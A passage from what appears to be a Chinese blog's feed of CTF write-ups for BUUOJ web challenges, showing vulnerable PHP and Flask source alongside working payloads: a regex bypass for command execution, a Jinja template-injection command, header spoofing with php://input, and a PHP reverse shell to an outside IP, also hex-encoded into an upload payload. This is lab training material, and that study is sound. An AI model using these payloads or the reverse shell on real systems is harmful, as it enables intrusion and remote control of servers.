class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_match对原来的字符串没有开启多行匹配, PATH环境变量被改了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0a&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure><p>第二种解法时正则回溯最大次数绕过</p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stunum=if(1,2,1)</span><br><span class="line">stunum=1^2</span><br></pre></td></tr></table></figure><p>两种手法都能测出来, 之后就是编写脚本, 这里就不浪费时间了</p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t=23333%0a</span><br></pre></td></tr></table></figure><p>到secrettw.php</p><p>源码里有一点jsFuck, 运行一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240530144140854.png" alt="image-20240530144140854"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>换ip用Client-IP: 127.0.0.1, 不过这里不回显ip, 但确实已经换掉了</p><p>之后是反算这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$re</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unchange</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d3663114-3245-44e1-9628-79b302dcc843.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Client-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-applescript">todat <span class="keyword">is</span> a happy <span class="built_in">day</span></span></span><br></pre></td></tr></table></figure><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题之前已经见过了, 直接看payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%ff?source</span><br></pre></td></tr></table></figure><p>basename会返回config.php这个字符串, 利用%ff绕过preg_match </p><blockquote><p>网址：<a href="https://www.example.com/php/index.php/test/foo?username=root">https://www.example.com/php/index.php/test/foo?username=root</a></p><p>$_SERVER[‘PHP_SELF’] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo<br>$_SERVER[‘SCRIPT_NAME’] 得到：&#x2F;php&#x2F;index.php<br>$_SERVER[‘REQUEST_URI’] 得到：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root</p></blockquote><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>Fenjin秒了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.next[&#x27;__g&#x27;&#x27;lobals__&#x27;].__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hex编码一下执行php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;107.148.75.202&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=exec(hex2bin(&quot;706870202d72202724736f636b3d66736f636b6f70656e28223130372e3134382e37352e323032222c31323334293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b27&quot;))?&gt;</span><br></pre></td></tr></table></figure><p>flag在根目录</p><h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p>有这样一个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=</span><br></pre></td></tr></table></figure><p>一开始按ssrf做发现file协议读取不了任何文件, 也探测不到其他端口的开放</p><p>看了WP才发现原来用的是python2的<code>urllib</code>的<code>urlopen</code>，和<code>urllib2</code>中的<code>urlopen</code>明显区别就是<code>urllib.urlopen</code>支持将路径作为参数去打开对应的本地路径，所以可以直接填入路径读取文件</p><p>不知道怎么看出来的python2的urllib, 只能看到响应头  Server: openresty</p><p>首先可以读当前的服务 &#x2F;proc&#x2F;self&#x2F;cmdline  </p><p>读取web服务的源码 &#x2F;page?url&#x3D;&#x2F;app&#x2F;app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>我们需要知道SECRET_KEY的内容才能得到shell</p><p>下面是它的由来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br></pre></td></tr></table></figure><p>这里读取后删除了txt, 但是并没有关闭这个f, 因此可以在&#x2F;proc&#x2F;self&#x2F;fd&#x2F;[num]中读取到内容</p><p>遍历一下num即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/fd/3</span><br></pre></td></tr></table></figure><p>读到key内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6mjoys/T/kzPpBeY3iDkOr0wcuHIm9Ake8ygyiKhAfQ=</span><br></pre></td></tr></table></figure><p>由于无回显, 反弹shell即可</p><p> 当然还有一个非预期是直接读取&#x2F;flag</p><p>flag{4d855645-f351-4353-af7c-1a993e5b92ab}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;buuoj一次刷个够&quot;&gt;&lt;a href=&quot;#buuoj一次刷个够&quot; class=&quot;headerlink&quot; title=&quot;buuoj一次刷个够&quot;&gt;&lt;/a&gt;buuoj一次刷个够&lt;/h1&gt;&lt;h2 id=&quot;FBCTF2019-RCEService&quot;&gt;&lt;a href=&quot;#F</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>第二届黄河流域安全技能挑战赛Web</title>
    <link href="http://example.com/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/"/>
